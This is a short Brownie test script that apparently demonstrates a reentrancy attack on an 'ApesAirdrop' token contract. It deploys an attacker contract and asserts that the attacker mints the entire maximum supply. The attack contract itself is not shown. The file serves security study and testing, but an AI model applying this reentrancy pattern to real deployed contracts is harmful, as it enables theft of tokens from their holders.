from brownie import accounts, ApesAirdrop, rAttack2
# Setting accounts

def test_reentrancy_2():
    #Setting accounts
    dep = accounts[0]
    user = accounts[1]
    attacker = accounts[2]

    # Deploying Target and Attacker contract
    re2 = ApesAirdrop.deploy({'from': dep})
    att = rAttack2.deploy(re2.address, {'from': attacker})

    # Creating array of address to interact with function addToWhitelist
    addr = []
    addr.append(dep.address)
    # Call function addToWhitelist and passing array of whitelisted addresses
    re2.addToWhitelist(addr)

    # Call to function grantMyWhitelist to whitelist Attacker contract
    re2.grantMyWhitelist(att.address, {'from':dep})

    # Asserting initial balances as 0
    assert(re2.balanceOf(attacker.address) ==0)
    assert(re2.balanceOf(att.address) ==0)

    # Attacking the function mint via attacker contract
    att.attack()
    # Asserting MaxSupply is equal attacker's balance
    assert(re2.balanceOf(attacker.address) ==att.maxSupply())
    assert(re2.balanceOf(att.address) ==0)
